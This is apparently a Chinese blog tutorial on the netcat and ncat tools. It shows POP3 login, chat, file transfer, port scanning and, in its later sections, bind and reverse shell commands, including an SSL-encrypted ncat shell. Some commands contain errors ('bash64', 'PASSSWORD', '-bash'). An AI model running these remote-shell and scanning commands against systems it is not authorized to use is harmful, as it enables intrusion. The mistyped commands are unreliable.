NC这款工具相信大家再熟悉不过了！它的体积非常喜小巧，但是功能却异常强大。

1.我们可以使用它来登录 163 的邮箱。

nc -vn 123.125.50.29 110

USER xxxxxxxx@163

PASSSWORD xxxxxxxx

注意：用户名密码必须使用 bash64 加密才能进行登录操作！

2. 可以作为文本界面的聊天工具使用。

在一边输入命令： nc -l -p 333

另一边进行连接：nc -nv 10.1.1.12 333

3. 接受对方的数据信息，并保存到 ps.txt 文件。

在一边输入接收命令： nc -l -p 333 > ps.txt

另一边进行传输：nc -nv 10.1.1.12 333 -q 1

4. 可以作为电子取证使用。

例如我们需要对另一台计算机进行取证，我们可以将被取证的信息在保证不动的情况下，映射给另一台。

nc -l -p 333

ls -l | nc -nv 10.1.1.12 333

5. 进行流媒体的传输。

nc -lp 333 > 2.mp4

nc -nv 10.1.1.12 333 < a.mp4 -q 1

同样我们也可以让对方连接我们时，对其进行发送信息。与上相反。

nc -lp 333 < 2.mp4

nc -nv 10.1.1.12 333 > a.mp4

6.可以进行端口扫描。

nc -nvz 10.1.1.11 1-65535  TCP端口扫描

nc -nvzu 10.1.1.11 1-65535   UDP端口扫描

7. NC实现强大的远程控制！

侦听方将 shell 给对方！

nc -nv 192.168.1.115 333

nc -lp 333 -bash

注意：如果是在 Windows上，我们需将 bash 改成 cmd 。

连接方将 shell 给侦听方！

nc -nv 192.168.1.115 333 -c bash

nc -lp 333

8. NCAT

这个工具可以说是NC的升级版，弥补了NC加密传输的不足！

侦听方：ncat -c bash –allow 192.168.1.119 -vnl 333 –ssl

连接方：ncat -nv 192.168.1.115 333 –ssl
